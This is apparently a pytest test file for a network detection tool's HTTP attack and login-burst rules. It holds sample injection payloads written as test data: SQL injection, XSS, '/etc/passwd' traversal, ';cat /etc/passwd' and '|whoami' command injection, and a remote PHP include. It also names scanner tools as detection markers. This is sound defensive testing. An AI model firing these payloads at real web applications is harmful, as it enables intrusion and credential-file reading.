"""Synthetic HTTP grammar, provenance, folding and authentication regressions."""
from datetime import UTC, datetime, timedelta
from types import SimpleNamespace
from urllib.parse import quote

import pytest

from romulus.detect.registry import ALL_PLAYBOOKS
from romulus.evidence.typed import RawRef, TypedEvent, fv


def rule_named(name):
    classes = {rule.id: rule for rule in ALL_PLAYBOOKS}
    assert name in classes, f"The network HTTP rule {name} must be registered"
    return classes[name]()


def event(uri="/ordinary", *, n=0, producer="zeek-ecs", source="192.0.2.8", destination="10.2.3.4",
          status=404, method="GET", agent="Mozilla/5.0", extra=None):
    session = producer == "arkime"
    values = {"source.ip": source, "destination.ip": destination,
              "url.path" if session else "url.original": uri,
              "http.request.method": method, "http.response.status_code": status,
              "user_agent.original": agent}
    if producer == "zeek-ecs":
        values.update({"observer.product": "zeek", "observer.name": "sensor-a"})
    values.update(extra or {})
    return TypedEvent(id=f"http-{producer}-{n}", family="net_session" if session else "http_tx",
                      ts=datetime(2025, 1, 1, tzinfo=UTC) + timedelta(seconds=n), host="sensor",
                      fields={key: fv(value, "native." + key) for key, value in values.items() if value is not None},
                      raw=[RawRef(target="synthetic-http", native_id=f"{producer}-{n}")],
                      normalizer=producer + "@1")


@pytest.fixture
def attack_rule():
    rule = rule_named("network.web_attacks")
    yield rule
    rule.close_spill()


@pytest.fixture
def login_rule():
    rule = rule_named("network.web_login_burst")
    yield rule
    rule.close_spill()


def finish(rule, rows):
    found = {match.group_key: match for match in rule.consume(rows)}
    found.update((match.group_key, match) for match in rule.finalize())
    return list(found.values())


def test_registered_http_rule_surfaces_an_injection():
    rule = rule_named("network.web_attacks")
    try:
        assert finish(rule, [event("/../../etc/passwd")])
    finally:
        rule.close_spill()


def test_registered_login_rule_surfaces_a_failure_burst():
    rule = rule_named("network.web_login_burst")
    try:
        assert finish(rule, [event("/login", n=n, status=401, method="POST") for n in range(20)])
    finally:
        rule.close_spill()


ATTACKS = [
    ("sql_injection", "/items?id=1%20UNION%20SELECT%20password%20FROM%20users"),
    ("sql_injection", "/items?id=1%27%20OR%201=1--"),
    ("sql_injection", "/items?id=1%27;select%20user()"),
    ("sql_injection", "/items?id=1+union/**/select+1"),
    ("cross_site_scripting", "/search?q=%3Cscript%3Ealert(1)%3C/script%3E"),
    ("cross_site_scripting", "/search?q=&lt;script&gt;alert(1)&lt;/script&gt;"),
    ("cross_site_scripting", "/search?q=%3Cimg%20src=x%20onerror=alert(1)%3E"),
    ("path_traversal_lfi", "/../../etc/passwd"),
    ("path_traversal_lfi", "/read?file=../../etc/passwd"),
    ("path_traversal_lfi", "/read?file=C:%5cWindows%5cwin.ini"),
    ("remote_file_inclusion", "/index.php?include=http://192.0.2.60/payload.php"),
    ("remote_file_inclusion", "/index.php?page=https://files.example/payload.php?"),
    ("command_injection", "/ping?host=127.0.0.1;cat+/etc/passwd"),
    ("command_injection", "/ping?host=x%7Cwhoami"),
    ("command_injection", "/ping?host=x%60id%60"),
    ("template_injection", "/hello?name=%7B%7B7*7%7D%7D"),
    ("template_injection", "/hello?name=%24%7B7*7%7D"),
]


@pytest.mark.parametrize("producer", ["zeek-ecs", "suricata-eve", "arkime"])
@pytest.mark.parametrize("attack_class,uri", ATTACKS)
def test_public_grammar_classes_use_typed_request_fields(attack_rule, producer, attack_class, uri):
    matches = finish(attack_rule, [event([uri] if producer == "arkime" else uri, producer=producer)])
    [match] = [item for item in matches if item.group_key.endswith("|" + attack_class)]
    assert match.group_key.endswith("|" + attack_class)
    assert match.proposed_lane == "lead"
    assert match.aggregate_summary["record_count"] == 1
    assert all(predicate.origin.startswith("native.") for predicate in match.predicate)
    assert match.events and match.events[0].raw


@pytest.mark.parametrize("uri", [
    "/search?q=select", "/search?q=union", "/search?q=script", "/search?q=union+select",
    "/api?data=%7B%22select%22%3A%22union%22%2C%22script%22%3Atrue%7D",
    "/api?token=c2VsZWN0IHVuaW9uIHNjcmlwdA==", "/article/union-select-history",
    "/find?q=the+union+will+select+a+representative", "/safe/../public/index.html",
    "/?next=https://accounts.example/login", "/?url=https://news.example/story",
    "/?options=alpha;beta|gamma", "/?name={{customer_name}}", "/?name=${customer_name}",
    "/?campaign=" + "a" * 8000, "https://portal.example/a/../b",
])
def test_adversarial_ordinary_urls_do_not_match(attack_rule, uri):
    assert finish(attack_rule, [event(uri)]) == []
    assert attack_rule.capped == 0


@pytest.mark.parametrize("agent", ["Googlebot/2.1", "Mozilla/5.0", "Prometheus/2.0", "sqlmapper/1", "my-nuclei-app"])
def test_benign_user_agents_are_not_tools(attack_rule, agent):
    assert finish(attack_rule, [event(agent=agent)]) == []


@pytest.mark.parametrize("agent", ["sqlmap/1.8", "Nikto/2.5", "Mozilla/5.0 / nuclei", "Nuclei/3.0", "commix/4.0"])
def test_known_tool_user_agents_are_attributed_leads(attack_rule, agent):
    [match] = finish(attack_rule, [event(agent=agent, status=200)])
    assert match.group_key.endswith("|exploit_tool")
    assert match.proposed_lane == "lead"
    assert any("Nasreddine Bencherchali" in note and "Tim Shelton" in note for note in match.notes)
    assert any("not established" in note for note in match.notes)


def test_percent_decoding_is_twice_at_most(attack_rule):
    attack = "<script>alert(1)</script>"
    assert finish(attack_rule, [event("/?q=" + quote(quote(attack)), n=1)])
    other = rule_named("network.web_attacks")
    try:
        assert finish(other, [event("/?q=" + quote(quote(quote(attack))))]) == []
    finally:
        other.close_spill()


@pytest.mark.parametrize("uri,reason", [("/?x=%c0%af", "utf8"), ("/?x=%E0%80%AF", "utf8"),
                                       ("/?x=%ed%a0%80", "utf8"), ("/?x=%ZZ", "percent"),
                                       ("/" + "a" * 17000, "length")])
def test_invalid_or_oversize_uris_are_counted_partial(attack_rule, uri, reason):
    assert finish(attack_rule, [event(uri)]) == []
    assert attack_rule.capped == 1
    assert any(reason in text.casefold() for text in attack_rule.limit_reasons())


def test_only_typed_values_are_read_and_foreign_producers_are_excluded(attack_rule):
    row = event(extra={"message": "<script>alert(1)</script>", "process.command_line": ";whoami"})
    attack_rule.bind_raw({row.raw[0].key: {"untrusted": "sqlmap/1.8", "url": "/../../etc/passwd"}})
    assert finish(attack_rule, [row, event("/../../etc/passwd", producer="untrusted")]) == []


def test_fold_is_exact_across_batches_replay_and_multiple_uri_views(attack_rule):
    rows = [event("/../../etc/passwd", n=n, extra={"url.path": "/../../etc/passwd"}) for n in range(40)]
    first = list(attack_rule.consume(rows[:17]))
    assert first and first[0].aggregate_summary["record_count"] == 1
    list(attack_rule.consume(rows[17:]))
    list(attack_rule.consume(rows))
    [match] = list(attack_rule.finalize())
    assert match.aggregate_summary["record_count"] == 40
    assert match.aggregate_summary["count_complete"] == 1
    assert len(match.events) <= 2
    assert match.bounded_revision


def test_peer_and_class_groups_are_independent(attack_rule):
    rows = [event("/../../etc/passwd"), event("/../../etc/passwd", source="192.0.2.9", n=1),
            event("/../../etc/passwd", destination="10.2.3.5", n=2),
            event("/?x=<script>alert(1)</script>", n=3)]
    assert len(finish(attack_rule, rows)) == 4


def test_arkime_lists_never_pair_status_or_user_agent_to_a_uri(attack_rule):
    row = event(["/", "/?x=<script>alert(1)</script>"], producer="arkime", status=[200, 404],
                agent=["sqlmap/1.8", "Mozilla/5.0"], method=["GET", "POST"])
    matches = finish(attack_rule, [row])
    assert {match.group_key.rsplit("|", 1)[1] for match in matches} == {"cross_site_scripting", "exploit_tool"}
    assert all(match.proposed_lane == "lead" for match in matches)
    assert all(any("unordered" in note for note in match.notes) for match in matches)


def test_oversize_arkime_list_retains_known_positive_and_counts_omission(attack_rule):
    uris = ["/../../etc/passwd"] + ["/ordinary"] * 1024
    [match] = finish(attack_rule, [event(uris, producer="arkime")])
    assert match.aggregate_summary["record_count"] == 1
    assert attack_rule.capped == 1
    assert match.aggregate_summary["count_complete"] == 0


def test_site_management_source_is_not_demoted(attack_rule):
    attack_rule.site_facts = SimpleNamespace(management_hosts=("192.0.2.8",))
    [match] = finish(attack_rule, [event("/../../etc/passwd")])
    assert match.proposed_lane == "lead"
    assert any("management" in note.casefold() for note in match.notes)


def test_login_failure_window_counts_repeated_and_distinct_accounts(login_rule):
    rows = [event(f"/login?username=user{n % 4}", n=n, status=401, method="POST") for n in range(25)]
    [match] = finish(login_rule, rows)
    assert match.proposed_lane == "lead"
    assert match.aggregate_summary["total_refs"] == 25
    assert match.aggregate_summary["distinct_members"] == 4
    assert "failure" in match.claim.casefold()


def test_login_200_is_attempt_not_success_and_threshold_is_local(login_rule):
    rows = [event("/login?user=same", n=n, status=200, method="POST") for n in range(20)]
    [match] = finish(login_rule, rows)
    assert match.proposed_lane == "lead"
    assert "success" not in match.claim.casefold()
    assert any("not established" in note for note in match.notes)


def test_login_does_not_count_get_form_fetch_or_ordinary_200_paths(login_rule):
    rows = [event("/login", n=n, status=200) for n in range(25)]
    rows += [event("/api/data", n=n + 100, status=200, method="POST") for n in range(25)]
    assert finish(login_rule, rows) == []


def test_login_accounts_absent_still_counts_attempts(login_rule):
    [match] = finish(login_rule, [event("/auth/signin", n=n, status=403, method="POST") for n in range(20)])
    assert match.aggregate_summary["total_refs"] == 20
    assert any("account" in note.casefold() and "unknown" in note.casefold() for note in match.notes)


def test_login_window_and_peer_boundaries(login_rule):
    rows = [event("/login?user=a", n=n * 40, status=401, method="POST") for n in range(20)]
    rows += [event("/login?user=a", n=1000+n, source=f"192.0.2.{n+10}", status=401, method="POST") for n in range(20)]
    assert finish(login_rule, rows) == []


def test_arkime_lists_never_count_as_login_attempts(login_rule):
    assert finish(login_rule, [event(["/login"], producer="arkime", status=[401], method=["POST"], n=n)
                               for n in range(30)]) == []


def test_login_duplicate_and_late_rows_replay_exactly(login_rule):
    rows = [event("/login?user=a", n=n, status=401, method="POST") for n in range(20)]
    list(login_rule.consume(rows[10:]))
    list(login_rule.consume(rows[:10]))
    list(login_rule.consume(rows))
    [match] = list(login_rule.finalize())
    assert match.aggregate_summary["total_refs"] == 20


def test_later_login_redirect_does_not_prove_authentication_success(login_rule):
    rows = [event("/login?user=a", n=n, status=401, method="POST") for n in range(20)]
    rows.append(event("/login?user=a", n=21, status=302, method="POST"))
    [match] = finish(login_rule, rows)
    assert match.proposed_lane == "lead"
    assert match.aggregate_summary["total_refs"] == 20
    assert "recorded authentication success" not in match.claim


def test_separate_query_and_path_fields_are_inspected(attack_rule):
    row = event(None, extra={"url.path": "/items", "url.query": "id=1+union+select+1"})
    [match] = finish(attack_rule, [row])
    assert match.group_key.endswith("|sql_injection")


@pytest.mark.parametrize("query", ["password=TOPSECRET&token=SECRETTOKEN", "p%61ssword=TOPSECRET",
                                   "password%3DTOPSECRET%26token%3DSECRETTOKEN"])
def test_retained_citations_do_not_store_recognised_query_secrets(attack_rule, query):
    [match] = finish(attack_rule, [event("/../../etc/passwd?" + query)])
    assert "TOPSECRET" not in str(match)
    assert "SECRETTOKEN" not in str(match)
    assert b"TOPSECRET" not in attack_rule._spill.path.read_bytes()


def test_absolute_uri_traversal_is_relative_to_its_authority(attack_rule):
    [match] = finish(attack_rule, [event("https://portal.example/../../private/data")])
    assert match.group_key.endswith("|path_traversal_lfi")


def test_login_retained_citations_mask_passwords(login_rule):
    [match] = finish(login_rule, [event("/login?user=a&password=TOPSECRET", n=n, status=401, method="POST")
                                for n in range(20)])
    assert "TOPSECRET" not in str(match)


def test_refused_disk_state_still_reports_live_positive_and_retained_counts(attack_rule, tmp_path):
    from romulus.detect.bounded import StateBudget

    attack_rule.budget = StateBudget(tmp_path, disk_total=8 * 2**20, reserve=0)
    list(attack_rule.consume([event("/../../etc/passwd", n=n) for n in range(12)]))
    attack_rule.budget.force_full("synthetic refusal", lambda account: True)
    observed = list(attack_rule.consume([event("/../../etc/passwd", source="192.0.2.99", n=20)]))
    assert len(observed) == 1 and observed[0].proposed_lane == "lead"
    [retained] = list(attack_rule.finalize())
    assert retained.aggregate_summary["record_count"] == 12
    assert retained.aggregate_summary["count_complete"] == 0
    assert attack_rule.capped == 1


@pytest.mark.parametrize("shape", ["original", "message", "filebeat", "agent", "malcolm"])
def test_suricata_native_http_producer_reaches_request_rule(attack_rule, shape):
    from romulus.evidence.normalize import normalize_hits
    from tests.test_suricata_protocols import hit

    raw = hit("http", {"url": "/?q=%3Cscript%3Ealert(1)%3C/script%3E", "http_method": "GET",
                       "http_user_agent": "Mozilla/5.0", "status": 404}, shape=shape)
    rows, skips, errors = normalize_hits([raw])
    assert not skips and not errors
    [match] = finish(attack_rule, rows)
    assert match.group_key.endswith("|cross_site_scripting")


@pytest.mark.parametrize("shape", ["malcolm", "elastic", "security_onion", "plain"])
def test_zeek_native_http_producer_reaches_request_rule(attack_rule, shape):
    from tests.fixtures import zeek_logs as zl
    from tests.test_zeek_windows_protocols import normalize

    raw = zl.WRITERS[shape](zl.HTTP.with_(uri="/../../etc/passwd"), "request")
    [match] = finish(attack_rule, [normalize(raw)])
    assert match.group_key.endswith("|path_traversal_lfi")


def test_arkime_native_uri_lists_reach_request_rule(attack_rule):
    from romulus.evidence.normalize import normalize_hits
    from tests.test_arkime_sessions import session

    raw = session("request")
    raw["_source"]["http"] = {"uri": ["/ordinary", "/../../etc/passwd"], "statuscode": [200, 404]}
    rows, skips, errors = normalize_hits([raw])
    assert not skips and not errors
    [match] = finish(attack_rule, rows)
    assert match.aggregate_summary["session_count"] == 1


def test_unknown_and_malformed_transaction_producer_versions_are_not_admitted(attack_rule):
    from romulus.detect.network_producers import HTTP_OBSERVATIONS, rule_reads

    for producer in ("arkime@0", "arkime@1junk", "suricata-eve@0"):
        row = event("/../../etc/passwd", producer="arkime" if producer.startswith("arkime") else "suricata-eve")
        row.normalizer = producer
        assert not rule_reads(row, HTTP_OBSERVATIONS)


def test_login_does_not_mix_sensor_attempts(login_rule):
    rows = [event("/login?user=a", n=n, status=401, method="POST", producer=producer)
            for producer in ("zeek-ecs", "suricata-eve") for n in range(10)]
    assert finish(login_rule, rows) == []


def test_decoded_literal_percent_is_not_malformed(attack_rule):
    assert finish(attack_rule, [event("/sale?discount=20%25")]) == []
    assert attack_rule.capped == 0


def test_inclusion_directive_accepts_remote_non_script_extension(attack_rule):
    [match] = finish(attack_rule, [event("/?include=https://files.example/payload.txt")])
    assert match.group_key.endswith("|remote_file_inclusion")


def test_partial_schema_refusal_can_retry_without_discarding_positive(attack_rule, monkeypatch):
    from romulus.detect.bounded import StateExhausted

    spill = attack_rule.spill()
    original = spill.table
    refused = False

    def interrupted(name, columns):
        nonlocal refused
        if name == "web_groups" and not refused:
            refused = True
            raise StateExhausted("synthetic schema interruption")
        return original(name, columns)

    monkeypatch.setattr(spill, "table", interrupted)
    first = list(attack_rule.consume([event("/../../private/a")]))
    second = list(attack_rule.consume([event("/../../private/b", n=1)]))
    assert first and second
    assert attack_rule.capped == 1


def test_malformed_uri_does_not_hide_independent_tool_marker(attack_rule):
    [match] = finish(attack_rule, [event("/bad?x=%c0%af", agent="sqlmap/1.0")])
    assert match.group_key.endswith("|exploit_tool")
    assert attack_rule.capped == 1


@pytest.mark.parametrize("secret", ["prefix%26TOPSECRET%3Dcredential", "prefix%2526TOPSECRET%253Dcredential",
                                    "prefix&amp;TOPSECRET=credential", "prefix%26amp%3BTOPSECRET=credential"])
def test_credential_value_encoded_delimiters_never_escape_redaction(attack_rule, secret):
    [match] = finish(attack_rule, [event("/../../private/data?password=" + secret)])
    assert "topsecret" not in str(match).casefold()
    rows = attack_rule._spill.db.execute("SELECT first_event,last_event FROM web_groups").fetchall()
    from romulus.hunt.citations import expand_event

    for row in rows:
        assert all("topsecret" not in str(expand_event(blob)).casefold() for blob in row if blob)


def test_one_partially_evaluated_record_is_not_counted_once_per_class(attack_rule, tmp_path):
    from romulus.detect.bounded import StateBudget

    attack_rule.budget = StateBudget(tmp_path, disk_total=2**20, reserve=0)
    attack_rule._db()
    attack_rule.budget.force_full("synthetic refusal", lambda account: True)
    matches = list(attack_rule.consume([event("/../../etc/passwd?x=<script>alert(1)</script>", agent="Nikto/2.5")]))
    assert len(matches) == 3
    assert attack_rule.capped == 1


def test_url_userinfo_credentials_are_not_retained(attack_rule):
    [match] = finish(attack_rule, [event("https://user:TOPSECRET@app.example/../../etc/passwd")])
    assert "topsecret" not in str(match).casefold()
    assert any("app.example" in str(predicate.value) for predicate in match.predicate)


def test_login_percent_encoded_account_delimiters_keep_distinct_labels(login_rule):
    [match] = finish(login_rule, [event("/login?user=a%26" + ("b" if n % 2 else "c"), n=n,
                                      status=401, method="POST") for n in range(20)])
    assert match.aggregate_summary["total_refs"] == 20
    assert match.aggregate_summary["distinct_members"] == 2


def test_login_account_case_and_encoded_equals_are_preserved(login_rule):
    [match] = finish(login_rule, [event("/login?user=" + ("Name%3Da" if n % 2 else "name%3Da"), n=n,
                                      status=403, method="POST") for n in range(20)])
    assert match.aggregate_summary["distinct_members"] == 2


@pytest.mark.parametrize("first,second", [("a%2Bb", "a+b"), ("a%26%23x62%3B", "ab"),
                                         ("a%26amp%3Bb", "a%26b"), ("a%2526b", "a%26b")])
def test_login_labels_use_one_form_decode_without_html_interpretation(login_rule, first, second):
    [match] = finish(login_rule, [event("/login?user=" + (first if n % 2 else second), n=n,
                                      status=401, method="POST") for n in range(20)])
    assert match.aggregate_summary["distinct_members"] == 2


@pytest.mark.parametrize("operator", ["%2B", "%252B"])
def test_template_arithmetic_encoded_plus_survives_percent_decoding(attack_rule, operator):
    [match] = finish(attack_rule, [event("/?name={{7" + operator + "7}}")])
    assert match.group_key.endswith("|template_injection")


def test_credential_bearing_get_200_counts_only_as_login_attempt(login_rule):
    [match] = finish(login_rule, [event("/login?username=alice&password=guess", n=n, status=200, method="GET")
                                for n in range(20)])
    assert match.proposed_lane == "lead"
    assert match.aggregate_summary["total_refs"] == 20
    assert "success" not in match.claim.casefold()
    assert "guess" not in str(match)


def test_get_200_with_username_only_remains_ordinary_form_fetch(login_rule):
    assert finish(login_rule, [event("/login?username=alice", n=n, status=200, method="GET")
                               for n in range(25)]) == []
